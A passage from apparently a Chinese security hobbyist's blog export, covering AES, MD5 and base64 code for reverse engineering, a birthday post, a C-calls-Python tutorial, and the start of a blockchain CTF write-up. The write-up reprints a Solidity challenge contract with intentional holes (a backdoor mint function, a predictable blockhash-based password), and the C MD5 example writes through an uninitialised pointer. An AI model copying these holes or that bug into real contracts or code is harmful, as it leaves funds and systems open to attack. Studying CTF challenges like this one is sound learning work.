偏移量，bytes 类型text = b'TextTextTextText' # 明文必须为 16 字节或者 16 字节的倍数的字节型数据，如果不够 16 字节需要进行补全aes = AES.new(password, AES.MODE_CBC, iv) # 创建一个 aes 对象# AES.MODE_CBC 表示模式是 CBC 模式en_text = aes.encrypt(text)print(\"密文：\", en_text) # 加密明文，bytes 类型aes = AES.new(password, AES.MODE_CBC, iv) # CBC 模式下解密需要重新创建一个 aes 对象de_text = aes.decrypt(en_text)print(\"明文：\", de_text)'''密文： b'v\\rv`HDi\\xbbV\\xcb\\xef\\x02\\x8f\\x93\\xb09'明文： b'TextTextTextText'''' todo todo # MD5 from hashlib import md5s = 'oacia'new_md5 = md5()new_md5.update(s.encode(encoding='utf-8'))s_enc = new_md5.hexdigest()print(s_enc)# 6a58e79a78afc9dd94485810106bc7e8 #include &lt;stdio.h>#include &lt;string.h>#include &lt;stdlib.h>#include \"md5.h\"void md5_enc(unsigned char encrypt[],unsigned char decrypt[])&#123; MD5_CTX md5; MD5Init(&amp;md5); MD5Update(&amp;md5,encrypt,strlen((char *)encrypt)); MD5Final(&amp;md5,decrypt);&#125;int main(int argc, char *argv[])&#123; char s[10] = \"oacia\"; unsigned char* s_enc; md5_enc(s,s_enc); for(int i=0;i&lt;16;i++)&#123; printf(\"%02x\",s_enc[i]);//6a58e79a78afc9dd94485810106bc7e8 &#125; return 0;&#125; #include &lt;memory.h>#include \"md5.h\" unsigned char PADDING[]=&#123;0x80,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0&#125;; void MD5Init(MD5_CTX *context)&#123; //md5 原始常量 context->count[0] = 0; context->count[1] = 0; context->state[0] = 0x67452301; context->state[1] = 0xEFCDAB89; context->state[2] = 0x98BADCFE; context->state[3] = 0x10325476;&#125;void MD5Update(MD5_CTX *context,unsigned char *input,unsigned int inputlen)&#123; unsigned int i = 0,index = 0,partlen = 0; index = (context->count[0] >> 3) &amp; 0x3F; partlen = 64 - index; context->count[0] += inputlen &lt;&lt; 3; if(context->count[0] &lt; (inputlen &lt;&lt; 3)) context->count[1]++; context->count[1] += inputlen >> 29; if(inputlen >= partlen) &#123; memcpy(&amp;context->buffer[index],input,partlen); MD5Transform(context->state,context->buffer); for(i = partlen;i+64 &lt;= inputlen;i+=64) MD5Transform(context->state,&amp;input[i]); index = 0; &#125; else &#123; i = 0; &#125; memcpy(&amp;context->buffer[index],&amp;input[i],inputlen-i);&#125;void MD5Final(MD5_CTX *context,unsigned char digest[16])&#123; unsigned int index = 0,padlen = 0; unsigned char bits[8]; index = (context->count[0] >> 3) &amp; 0x3F; padlen = (index &lt; 56)?(56-index):(120-index); MD5Encode(bits,context->count,8); MD5Update(context,PADDING,padlen); MD5Update(context,bits,8); MD5Encode(digest,context->state,16);&#125;void MD5Encode(unsigned char *output,unsigned int *input,unsigned int len)&#123; unsigned int i = 0,j = 0; while(j &lt; len) &#123; output[j] = input[i] &amp; 0xFF; output[j+1] = (input[i] >> 8) &amp; 0xFF; output[j+2] = (input[i] >> 16) &amp; 0xFF; output[j+3] = (input[i] >> 24) &amp; 0xFF; i++; j+=4; &#125;&#125;void MD5Decode(unsigned int *output,unsigned char *input,unsigned int len)&#123; unsigned int i = 0,j = 0; while(j &lt; len) &#123; output[i] = (input[j]) | (input[j+1] &lt;&lt; 8) | (input[j+2] &lt;&lt; 16) | (input[j+3] &lt;&lt; 24); i++; j+=4; &#125;&#125;void MD5Transform(unsigned int state[4],unsigned char block[64])&#123; unsigned int a = state[0]; unsigned int b = state[1]; unsigned int c = state[2]; unsigned int d = state[3]; unsigned int x[64]; MD5Decode(x,block,64); FF(a, b, c, d, x[ 0], 7, 0xd76aa478); /* 1 */ FF(d, a, b, c, x[ 1], 12, 0xe8c7b756); /* 2 */ FF(c, d, a, b, x[ 2], 17, 0x242070db); /* 3 */ FF(b, c, d, a, x[ 3], 22, 0xc1bdceee); /* 4 */ FF(a, b, c, d, x[ 4], 7, 0xf57c0faf); /* 5 */ FF(d, a, b, c, x[ 5], 12, 0x4787c62a); /* 6 */ FF(c, d, a, b, x[ 6], 17, 0xa8304613); /* 7 */ FF(b, c, d, a, x[ 7], 22, 0xfd469501); /* 8 */ FF(a, b, c, d, x[ 8], 7, 0x698098d8); /* 9 */ FF(d, a, b, c, x[ 9], 12, 0x8b44f7af); /* 10 */ FF(c, d, a, b, x[10], 17, 0xffff5bb1); /* 11 */ FF(b, c, d, a, x[11], 22, 0x895cd7be); /* 12 */ FF(a, b, c, d, x[12], 7, 0x6b901122); /* 13 */ FF(d, a, b, c, x[13], 12, 0xfd987193); /* 14 */ FF(c, d, a, b, x[14], 17, 0xa679438e); /* 15 */ FF(b, c, d, a, x[15], 22, 0x49b40821); /* 16 */ /* Round 2 */ GG(a, b, c, d, x[ 1], 5, 0xf61e2562); /* 17 */ GG(d, a, b, c, x[ 6], 9, 0xc040b340); /* 18 */ GG(c, d, a, b, x[11], 14, 0x265e5a51); /* 19 */ GG(b, c, d, a, x[ 0], 20, 0xe9b6c7aa); /* 20 */ GG(a, b, c, d, x[ 5], 5, 0xd62f105d); /* 21 */ GG(d, a, b, c, x[10], 9, 0x2441453); /* 22 */ GG(c, d, a, b, x[15], 14, 0xd8a1e681); /* 23 */ GG(b, c, d, a, x[ 4], 20, 0xe7d3fbc8); /* 24 */ GG(a, b, c, d, x[ 9], 5, 0x21e1cde6); /* 25 */ GG(d, a, b, c, x[14], 9, 0xc33707d6); /* 26 */ GG(c, d, a, b, x[ 3], 14, 0xf4d50d87); /* 27 */ GG(b, c, d, a, x[ 8], 20, 0x455a14ed); /* 28 */ GG(a, b, c, d, x[13], 5, 0xa9e3e905); /* 29 */ GG(d, a, b, c, x[ 2], 9, 0xfcefa3f8); /* 30 */ GG(c, d, a, b, x[ 7], 14, 0x676f02d9); /* 31 */ GG(b, c, d, a, x[12], 20, 0x8d2a4c8a); /* 32 */ /* Round 3 */ HH(a, b, c, d, x[ 5], 4, 0xfffa3942); /* 33 */ HH(d, a, b, c, x[ 8], 11, 0x8771f681); /* 34 */ HH(c, d, a, b, x[11], 16, 0x6d9d6122); /* 35 */ HH(b, c, d, a, x[14], 23, 0xfde5380c); /* 36 */ HH(a, b, c, d, x[ 1], 4, 0xa4beea44); /* 37 */ HH(d, a, b, c, x[ 4], 11, 0x4bdecfa9); /* 38 */ HH(c, d, a, b, x[ 7], 16, 0xf6bb4b60); /* 39 */ HH(b, c, d, a, x[10], 23, 0xbebfbc70); /* 40 */ HH(a, b, c, d, x[13], 4, 0x289b7ec6); /* 41 */ HH(d, a, b, c, x[ 0], 11, 0xeaa127fa); /* 42 */ HH(c, d, a, b, x[ 3], 16, 0xd4ef3085); /* 43 */ HH(b, c, d, a, x[ 6], 23, 0x4881d05); /* 44 */ HH(a, b, c, d, x[ 9], 4, 0xd9d4d039); /* 45 */ HH(d, a, b, c, x[12], 11, 0xe6db99e5); /* 46 */ HH(c, d, a, b, x[15], 16, 0x1fa27cf8); /* 47 */ HH(b, c, d, a, x[ 2], 23, 0xc4ac5665); /* 48 */ /* Round 4 */ II(a, b, c, d, x[ 0], 6, 0xf4292244); /* 49 */ II(d, a, b, c, x[ 7], 10, 0x432aff97); /* 50 */ II(c, d, a, b, x[14], 15, 0xab9423a7); /* 51 */ II(b, c, d, a, x[ 5], 21, 0xfc93a039); /* 52 */ II(a, b, c, d, x[12], 6, 0x655b59c3); /* 53 */ II(d, a, b, c, x[ 3], 10, 0x8f0ccc92); /* 54 */ II(c, d, a, b, x[10], 15, 0xffeff47d); /* 55 */ II(b, c, d, a, x[ 1], 21, 0x85845dd1); /* 56 */ II(a, b, c, d, x[ 8], 6, 0x6fa87e4f); /* 57 */ II(d, a, b, c, x[15], 10, 0xfe2ce6e0); /* 58 */ II(c, d, a, b, x[ 6], 15, 0xa3014314); /* 59 */ II(b, c, d, a, x[13], 21, 0x4e0811a1); /* 60 */ II(a, b, c, d, x[ 4], 6, 0xf7537e82); /* 61 */ II(d, a, b, c, x[11], 10, 0xbd3af235); /* 62 */ II(c, d, a, b, x[ 2], 15, 0x2ad7d2bb); /* 63 */ II(b, c, d, a, x[ 9], 21, 0xeb86d391); /* 64 */ state[0] += a; state[1] += b; state[2] += c; state[3] += d;&#125; #ifndef MD5_H#define MD5_H typedef struct&#123; unsigned int count[2]; unsigned int state[4]; unsigned char buffer[64]; &#125;MD5_CTX; #define F(x,y,z) ((x &amp; y) | (~x &amp; z))#define G(x,y,z) ((x &amp; z) | (y &amp; ~z))#define H(x,y,z) (x^y^z)#define I(x,y,z) (y ^ (x | ~z))#define ROTATE_LEFT(x,n) ((x &lt;&lt; n) | (x >> (32-n)))#define FF(a,b,c,d,x,s,ac) \\ &#123; \\ a += F(b,c,d) + x + ac; \\ a = ROTATE_LEFT(a,s); \\ a += b; \\ &#125;#define GG(a,b,c,d,x,s,ac) \\ &#123; \\ a += G(b,c,d) + x + ac; \\ a = ROTATE_LEFT(a,s); \\ a += b; \\ &#125;#define HH(a,b,c,d,x,s,ac) \\ &#123; \\ a += H(b,c,d) + x + ac; \\ a = ROTATE_LEFT(a,s); \\ a += b; \\ &#125;#define II(a,b,c,d,x,s,ac) \\ &#123; \\ a += I(b,c,d) + x + ac; \\ a = ROTATE_LEFT(a,s); \\ a += b; \\ &#125; void MD5Init(MD5_CTX *context);void MD5Update(MD5_CTX *context,unsigned char *input,unsigned int inputlen);void MD5Final(MD5_CTX *context,unsigned char digest[16]);void MD5Transform(unsigned int state[4],unsigned char block[64]);void MD5Encode(unsigned char *output,unsigned int *input,unsigned int len);void MD5Decode(unsigned int *output,unsigned char *input,unsigned int len); #endif # DES # base import base64raw_table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='# 如果遇到换表 base64, 修改 new_table!!new_table = 'BACDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='dictionary_decode = str.maketrans(new_table, raw_table) # 创建字符映射关系 用于 base64decodedictionary_encode = dict(zip(dictionary_decode.values(),dictionary_decode.keys())) # 创建一个与上面反向的映射关系用于 base64encoderesult = 'qqq' # 123123 原始的数据result_b64 = base64.b64encode(result.encode()).decode() # 正常 base64new_result_b64 = result_b64.translate(dictionary_encode) # 换表 base64print(new_result_b64) import string# base 字符集base64_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '+/'def encrypt(origin_bytes): \"\"\" 将bytes类型编码为base64 :param origin_bytes:需要编码的bytes :return:base64字符串 \"\"\" # 将每一位 bytes 转换为二进制字符串 base64_bytes = ['&#123;:0>8&#125;'.format(str(bin(b)).replace('0b', '')) for b in origin_bytes] resp = '' nums = len(base64_bytes) // 3 remain = len(base64_bytes) % 3 integral_part = base64_bytes[0:3 * nums] while integral_part: # 取三个字节，以每 6 比特，转换为 4 个整数 tmp_unit = ''.join(integral_part[0:3]) tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]] # 取对应 base64 字符 resp += ''.join([base64_charset[i] for i in tmp_unit]) integral_part = integral_part[3:] if remain: # 补齐三个字节，每个字节补充 0000 0000 remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8 # 取三个字节，以每 6 比特，转换为 4 个整数 # 剩余 1 字节可构造 2 个 base64 字符，补充 ==；剩余 2 字节可构造 3 个 base64 字符，补充 = tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1] resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '=' return respdef decrypt(base64_str): \"\"\" 解码base64字符串 :param base64_str:base64字符串 :return:解码后的bytearray；若入参不是合法base64字符串，返回空bytearray \"\"\" if not valid_base64_str(base64_str): return bytearray() # 对每一个 base64 字符取下标索引，并转换为 6 为二进制字符串 base64_bytes = ['&#123;:0>6&#125;'.format(str(bin(base64_charset.index(s))).replace('0b', '')) for s in base64_str if s != '='] resp = bytearray() nums = len(base64_bytes) // 4 remain = len(base64_bytes) % 4 integral_part = base64_bytes[0:4 * nums] while integral_part: # 取 4 个 6 位 base64 字符，作为 3 个字节 tmp_unit = ''.join(integral_part[0:4]) tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]] for i in tmp_unit: resp.append(i) integral_part = integral_part[4:] if remain: remain_part = ''.join(base64_bytes[nums * 4:]) tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)] for i in tmp_unit: resp.append(i) return respdef valid_base64_str(b_str): \"\"\" 验证是否为合法base64字符串 :param b_str: 待验证的base64字符串 :return:是否合法 \"\"\" if len(b_str) % 4: return False for m in b_str: if m not in base64_charset: return False return Trueif __name__ == '__main__': s = 'this is base64!' ciphertext = encrypt(s.encode()) print('ciphertext:', ciphertext) decrypted = decrypt(ciphertext).decode() print('decrypted:', decrypted)'''ciphertext: dGhpcyBpcyBiYXNlNjQhdecrypted: this is base64!''' #include &lt;stdio.h> #include &lt;string.h> #include &lt;stdlib.h> unsigned char *base64_encode(unsigned char *str) &#123; long len; long str_len; unsigned char *res; int i,j; // 定义 base64 编码表 unsigned char *base64_table=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"; // 计算经过 base64 编码后的字符串长度 str_len=strlen(str); if(str_len % 3 == 0) len=str_len/3*4; else len=(str_len/3+1)*4; res=malloc(sizeof(unsigned char)*len+1); res[len]='\\0'; // 以 3 个 8 位字符为一组进行编码 for(i=0,j=0;i&lt;len-2;j+=3,i+=4) &#123; res[i]=base64_table[str[j]>>2]; // 取出第一个字符的前 6 位并找出对应的结果字符 res[i+1]=base64_table[(str[j]&amp;0x3)&lt;&lt;4 | (str[j+1]>>4)]; // 将第一个字符的后位与第二个字符的前 4 位进行组合并找到对应的结果字符 res[i+2]=base64_table[(str[j+1]&amp;0xf)&lt;&lt;2 | (str[j+2]>>6)]; // 将第二个字符的后 4 位与第三个字符的前 2 位组合并找出对应的结果字符 res[i+3]=base64_table[str[j+2]&amp;0x3f]; // 取出第三个字符的后 6 位并找出结果字符 &#125; switch(str_len % 3) &#123; case 1: res[i-2]='='; res[i-1]='='; break; case 2: res[i-1]='='; break; &#125; return res; &#125; unsigned char *base64_decode(unsigned char *code) &#123; // 根据 base64 表，以字符找到对应的十进制数据 int table[]=&#123;0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,62,0,0,0, 63,52,53,54,55,56,57,58, 59,60,61,0,0,0,0,0,0,0,0, 1,2,3,4,5,6,7,8,9,10,11,12, 13,14,15,16,17,18,19,20,21, 22,23,24,25,0,0,0,0,0,0,26, 27,28,29,30,31,32,33,34,35, 36,37,38,39,40,41,42,43,44, 45,46,47,48,49,50,51 &#125;; long len; long str_len; unsigned char *res; int i,j; // 计算解码后的字符串长度 len=strlen(code); // 判断编码后的字符串后是否有 = if(strstr(code,\"==\")) str_len=len/4*3-2; else if(strstr(code,\"=\")) str_len=len/4*3-1; else str_len=len/4*3; res=malloc(sizeof(unsigned char)*str_len+1); res[str_len]='\\0'; // 以 4 个字符为一位进行解码 for(i=0,j=0;i &lt; len-2;j+=3,i+=4) &#123; res[j]=((unsigned char)table[code[i]])&lt;&lt;2 | (((unsigned char)table[code[i+1]])>>4); // 取出第一个字符对应 base64 表的十进制数的前 6 位与第二个字符对应 base64 表的十进制数的后 2 位进行组合 res[j+1]=(((unsigned char)table[code[i+1]])&lt;&lt;4) | (((unsigned char)table[code[i+2]])>>2); // 取出第二个字符对应 base64 表的十进制数的后 4 位与第三个字符对应 bas464 表的十进制数的后 4 位进行组合 res[j+2]=(((unsigned char)table[code[i+2]])&lt;&lt;6) | ((unsigned char)table[code[i+3]]); // 取出第三个字符对应 base64 表的十进制数的后 2 位与第 4 个字符进行组合 &#125; return res; &#125; int main(int argc,char **argv) &#123; unsigned char *buf =NULL; unsigned char *str = \"this is base64!\"; buf = base64_encode(str); printf(\"cipheytext: %s\\n\",buf); buf = base64_decode(buf); printf(\"decrypted: %s\\n\",buf); free(buf); return 0; &#125;/*cipheytext: dGhpcyBpcyBiYXNlNjQhdecrypted: this is base64! */ todo todo todo todo todo todo # blowfish # chacha20","categories":[],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://oacia.dev/tags/%E9%80%86%E5%90%91/"},{"name":"算法","slug":"算法","permalink":"https://oacia.dev/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"祝小夏生日快乐(๑˃́ꇴ˂̀๑)","slug":"祝小夏生日快乐！̋(๑˃́ꇴ˂̀๑)","date":"2022-12-03T16:00:00.000Z","updated":"2025-04-08T18:55:12.209Z","comments":true,"path":"祝小夏生日快乐！̋(๑˃́ꇴ˂̀๑)/","link":"","permalink":"https://oacia.dev/%E7%A5%9D%E5%B0%8F%E5%A4%8F%E7%94%9F%E6%97%A5%E5%BF%AB%E4%B9%90%EF%BC%81%CC%8B(%E0%B9%91%CB%83%CC%81%EA%87%B4%CB%82%CC%80%E0%B9%91)/","excerpt":"","text":"# 12 月 4 号，小夏的生日到啦，真是一件令人开心的事～ 这位是放学后甜品部的麻烦制造第一名以及自称浪漫家的小夏同学！ 抱着「想和大家一起分享浪漫」的心情、经常说出爆炸性发言并把周围都牵扯进来、「浪漫」的定义也经常变化着的样子…。 「关于奶油蛋糕有想到过些什么吗？ 」 还记得今年九月份入坑蔚蓝档案的时候，就是因为看见了小夏，她实在太可爱了 (≧▽≦)","categories":[],"tags":[{"name":"柚鸟夏","slug":"柚鸟夏","permalink":"https://oacia.dev/tags/%E6%9F%9A%E9%B8%9F%E5%A4%8F/"}]},{"title":"在C语言中调用Python","slug":"用c调用python","date":"2022-11-08T16:00:00.000Z","updated":"2025-04-08T18:55:12.200Z","comments":true,"path":"用c调用python/","link":"","permalink":"https://oacia.dev/%E7%94%A8c%E8%B0%83%E7%94%A8python/","excerpt":"","text":"# 0x0 start 首先导入 Python.h, 并添加 python37_d.lib 依赖 # 0x1 遇到的问题 刚开始跟着教程走，结果总是提示缺少 python37_d.lib 依赖，后来根据下面的找到的教程才发现库目录才是有依赖搜索的目录 ~~ 看教程里是从上往下数第四个改成了 C:\\environment\\Python37\\libs 结果被骗了…~~QAQ https://blog.csdn.net/bandaoyu/article/details/105102945 于是 vs 的 VC++ 目录的配置可以如图所示 并且在链接器的输入子目录内添加 python python37_d.lib 依赖 这样修改 Python.h 头文件可以正确的包含进来 # 0x2 试用网上的 c 调用 python 的代码 #include&lt;stdio.h>#include &lt;Python.h>int main()&#123; PyObject *pName, *pModule, *pDict, *pFunc; PyObject *pArgs, *pValue; // 待传参数 int time[6]=&#123;1,2,3,4,5,6&#125;; // 初始化 python Py_Initialize(); // 检查初始化是否成功 if (!Py_IsInitialized()) &#123; printf(\"初始化失败\\n\"); Py_Finalize(); &#125; // 设置 python 模块，搜寻位置，文件放在.c 文件一起 PyRun_SimpleString(\"import sys\"); PyRun_SimpleString(\"sys.path.append('./')\"); // 获取 python 文件名，导入模块（我这里的 py 文件是 graph.py） pModule = PyImport_ImportModule(\"graph\"); if (!pModule) &#123; printf(\"py文件导入失败\\n\"); Py_Finalize(); &#125; else &#123; // 直接获取模块中的函数 pFunc = PyObject_GetAttrString(pModule, \"create_graph\"); // 验证函数是否获取成功 if (!pFunc) &#123; printf(\"函数导入失败\\n\"); Py_Finalize(); &#125; // 将 c/c++ 类型数据转换为 python 类型，利用元组传递 pArgs = PyTuple_New(6); pValue = PyLong_FromLong(time[0]); PyTuple_SetItem(pArgs, 0, pValue); pValue = PyLong_FromLong(time[1]); PyTuple_SetItem(pArgs, 1, pValue); pValue = PyLong_FromLong(time[2]); PyTuple_SetItem(pArgs, 2, pValue); pValue = PyLong_FromLong(time[3]); PyTuple_SetItem(pArgs, 3, pValue); pValue = PyLong_FromLong(time[4]); PyTuple_SetItem(pArgs, 4, pValue); pValue = PyLong_FromLong(time[5]); PyTuple_SetItem(pArgs, 5, pValue); // 调用直接获得的函数，并传递参数 pValue = PyObject_CallObject(pFunc, pArgs); // 释放 python Py_Finalize(); printf(\"success\"); return 0; &#125;&#125;graph.py 的代码 # -*- coding:utf-8 -*-import xlsxwriterdef create_graph(a,b,c,d,e,f): # 创建一个 excel workbook = xlsxwriter.Workbook(\"排序算法比较结果.xlsx\") # 创建一个 sheet worksheet = workbook.add_worksheet() # worksheet = workbook.add_worksheet(\"bug_analysis\") # 自定义样式，加粗 bold = workbook.add_format(&#123;'bold': 1&#125;) # --------1、准备数据并写入 excel--------------- # 向 excel 中写入数据，建立图标时要用到 headings = [\"排序方法\", \"排序时间\"] data = [[\"简单选择排序\", \"直接插入排序\", \"冒泡排序\", \"快速排序\", \"两路合并排序\", \"堆排序\"],[a,b,c,d,e,f]] # 写入表头 worksheet.write_row('A1', headings, bold) # 写入数据 worksheet.write_column('A2', data[0]) worksheet.write_column('B2', data[1]) # --------2、生成图表并插入到 excel--------------- # 创建一个柱状图 (column chart) chart_col = workbook.add_chart(&#123;'type': 'column'&#125;) # 配置第一个系列数据 chart_col.add_series(&#123;'name': '=Sheet1!$B$1','categories': '=Sheet1!$A$2:$A$7','values': '=Sheet1!$B$2:$B$7','line': &#123;'color': 'red'&#125;,&#125;) # 这里的 sheet1 是默认的值，因为我们在新建 sheet 时没有指定 sheet 名 # 如果我们新建 sheet 时设置了 sheet 名，这里就要设置成相应的值 # 设置图表的 title 和 x，y 轴信息 chart_col.set_title(&#123;'name': \"排序算法结果\"&#125;) chart_col.set_x_axis(&#123;'name': \"排序方法\"&#125;) chart_col.set_y_axis(&#123;'name': \"花费时间(ms)\"&#125;) # 设置图表的风格 chart_col.set_style(1) # 把图表插入到 worksheet 以及偏移 worksheet.insert_chart('A10', chart_col, &#123;'x_offset': 25, 'y_offset': 10&#125;) workbook.close() return 0if __name__==\"__main__\": create_graph(10, 40, 50, 20, 10, 50) 芜湖运行成功！ 没想到第一次运行就如此顺利 在看看源文件下的目录有没有生成 .xlsx 文件 确实多了一个，不错不错. # 0x3 自己写一个 helloworld! 不过这个 helloworld 是调用 python 的函数打印的 可恶新开了一个解决方案，又得重新配置包含目录了， 心累 #include&lt;Python.h>#include&lt;stdio.h>int main()&#123; PyObject* pName, * pModule, * pDict, * pFunc; PyObject* pArgs, * pValue;// 经典复制粘贴变量（这玩意儿自己一个一个打也太麻烦了而且也记不住呀） Py_Initialize();// 初始化一下～ if (!Py_IsInitialized())// 看看初始化有没有成功 &#123; printf(\"初始化失败\\n\"); Py_Finalize(); &#125; PyRun_SimpleString(\"import sys\");// 设置 python 模块，搜寻位置，文件放在.c 文件一起 PyRun_SimpleString(\"sys.path.append(./)\"); pModule = PyImport_ImportModule(\"hello\");// 导入 hello.py if (!pModule) &#123; printf(\"py文件导入失败\\n\"); Py_Finalize(); &#125; else//hello.py 如果打开成功，直接获取模块的函数 &#123; pFunc = PyObject_GetAttrString(pModule, \"printhello\"); if (!pFunc) &#123; printf(\"函数导入失败\\n\"); Py_Finalize(); &#125; &#125; // 没参数，就不用 demo0 里面那么麻烦啊吧啊吧了～ pValue = PyObject_CallObject(pFunc, pArgs);// 调用函数 Py_Finalize();// 释放 python return 0;&#125;def printhello() print(\"hello,world!\")printhello()写好啦～运行看看 pFunc 可能未初始化都不让运行，真 gou! #include&lt;Python.h>#include&lt;stdio.h>int main()&#123; PyObject* pName, * pModule, * pDict, * pFunc; PyObject* pArgs,* pValue;// 经典复制粘贴变量（这玩意儿自己一个一个打也太麻烦了而且也记不住呀） Py_Initialize();// 初始化一下～ if (!Py_IsInitialized())// 看看初始化有没有成功 &#123; printf(\"初始化失败\\n\"); Py_Finalize(); &#125; PyRun_SimpleString(\"import sys\");// 设置 python 模块，搜寻位置，文件放在.c 文件一起 PyRun_SimpleString(\"sys.path.append('./')\"); pModule = PyImport_ImportModule(\"hello\");// 导入 hello.py if (!pModule) &#123; printf(\"py文件导入失败\\n\"); Py_Finalize(); return 1; &#125; pFunc = PyObject_GetAttrString(pModule, \"printhello\"); if (!pFunc) &#123; printf(\"函数导入失败\\n\"); Py_Finalize(); &#125; pArgs = NULL; pValue = PyObject_CallObject(pFunc, pArgs);// 调用函数 Py_Finalize();// 释放 python return 0;&#125;代码改好可以运行咯 为啥这个 hello,world! 输出两次嘞 看来 c 调用 python 也是先把 main 函数运行一遍的哈 # 0x4 接下来，开始逆向的工作～ 单独运行一下 can can 晕！还得 py 文件才能让你老老实实运行吗！？ 把 hello.py 拖进去一份，, 正常运行 IDA 进去看看 # 参考资料 https://www.jb51.net/article/212125.htm","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://oacia.dev/tags/python/"},{"name":"C语言","slug":"C语言","permalink":"https://oacia.dev/tags/C%E8%AF%AD%E8%A8%80/"},{"name":"交叉编译","slug":"交叉编译","permalink":"https://oacia.dev/tags/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/"}]},{"title":"2022哔哩哔哩 1024程序员节 T4 区块链详解","slug":"2022哔哩哔哩_1024程序员节_T4_区块链详解","date":"2022-10-31T16:00:00.000Z","updated":"2025-04-08T18:55:11.177Z","comments":true,"path":"2022哔哩哔哩_1024程序员节_T4_区块链详解/","link":"","permalink":"https://oacia.dev/2022%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9_1024%E7%A8%8B%E5%BA%8F%E5%91%98%E8%8A%82_T4_%E5%8C%BA%E5%9D%97%E9%93%BE%E8%AF%A6%E8%A7%A3/","excerpt":"本次题目的地址为 sepolia@0x053cd080A26CB03d5E6d2956CeBB31c56E7660CA # 前言 这一次 1024 程序员节中有区块链相关的题目，作为今年才开始起步区块链的小萌新，这一题也是整整看了一整个周末才做出来，不过做出来之后也是相当的具有成就感滴：), 话不多说，我们现在就来看一看如何做出这一题.","text":"本次题目的地址为 sepolia@0x053cd080A26CB03d5E6d2956CeBB31c56E7660CA # 前言 这一次 1024 程序员节中有区块链相关的题目，作为今年才开始起步区块链的小萌新，这一题也是整整看了一整个周末才做出来，不过做出来之后也是相当的具有成就感滴：), 话不多说，我们现在就来看一看如何做出这一题. # 源码 先上合约源码↓↓↓↓↓↓ // SPDX-License-Identifier: MIT// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/ERC20.sol)pragma solidity 0.8.12;import \"./IERC20.sol\";import \"./IERC20Metadata.sol\";import \"./Context.sol\";//import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";//import \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\";//import \"@openzeppelin/contracts/utils/Context.sol\";struct Coupon &#123; uint loankey; uint256 amount; address buser; bytes reason;&#125;struct Signature &#123; uint8 v; bytes32[2] rs;&#125;struct SignCoupon &#123; Coupon coupon; Signature signature;&#125;contract MyToken is Context, IERC20, IERC20Metadata &#123; mapping(address => uint256) public _balances; mapping(address => uint) public _ebalances; mapping(address => uint) public ethbalances; mapping(address => mapping(address => uint256)) private _allowances; mapping(address => uint) public _profited; mapping(address => uint) public _auth_one; mapping(address => uint) public _authd; mapping(address => uint) public _loand; mapping(address => uint) public _flag; mapping(address => uint) public _depositd; uint256 private _totalSupply; string private _name; string private _symbol; address owner; address backup; uint secret; uint tokenprice; Coupon public c; address public lala; address public xixi; //mid = bilibili uid //b64email = base64(your email address) //Don't leak your bilibili uid //Gmail is ok. 163 and qq may have some problems. event sendflag(string mid, string b64email); event changeprice(uint secret_); constructor(string memory name_, string memory symbol_, uint secret_) &#123; _name = name_; _symbol = symbol_; owner = msg.sender; backup = msg.sender; tokenprice = 6; secret = secret_; _mint(owner, 2233102400); &#125; modifier onlyowner() &#123; require(msg.sender == owner); _; &#125; /** * @dev Returns the name of the token. */ function name() public view virtual override returns (string memory) &#123; return _name; &#125; function symbol() public view virtual override returns (string memory) &#123; return _symbol; &#125; function decimals() public view virtual override returns (uint8) &#123; return 18; &#125; /** * @dev See &#123;IERC20-totalSupply&#125;. */ function totalSupply() public view virtual override returns (uint256) &#123; return _totalSupply; &#125; /** * @dev See &#123;IERC20-balanceOf&#125;. */ function balanceOf(address account) public view virtual override returns (uint256) &#123; return _balances[account]; &#125; function transfer(address to, uint256 amount) public virtual override returns (bool) &#123; address owner = _msgSender(); _transfer(owner, to, amount); return true; &#125; function deposit() public &#123; require(_depositd[msg.sender] == 0, \"you can only deposit once\"); _depositd[msg.sender] = 1; ethbalances[msg.sender] += 1; &#125; function getBalance() public view returns (uint) &#123; return address(this).balance; &#125; function setbackup() public onlyowner &#123; owner = backup; &#125; function ownerbackdoor() public &#123; require(msg.sender == owner); _mint(owner, 1000); &#125; function auth1(uint pass_) public &#123; require(pass_ == secret, \"auth fail\"); require(_authd[msg.sender] == 0, \"already authd\"); _auth_one[msg.sender] += 1; _authd[msg.sender] += 1; &#125; function auth2(uint pass_) public &#123; uint pass = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))); require(pass == pass_, \"password error, auth fail\"); require(_auth_one[msg.sender] == 1, \"need pre auth\"); require(_authd[msg.sender] == 1, \"already authd\"); _authd[msg.sender] += 1; &#125; function payforflag(string memory mid, string memory b64email) public &#123; require(_flag[msg.sender] == 2); emit sendflag(mid, b64email); &#125; function flashloan(SignCoupon calldata scoupon) public &#123; require(scoupon.coupon.loankey == 0, \"loan key error\"); require(msg.sender == address(this), \"hacker get out\"); Coupon memory coupon = scoupon.coupon; Signature memory sig = scoupon.signature; c=coupon; require(_authd[scoupon.coupon.buser] == 2, \"need pre auth\"); require(_loand[scoupon.coupon.buser] == 0, \"you have already 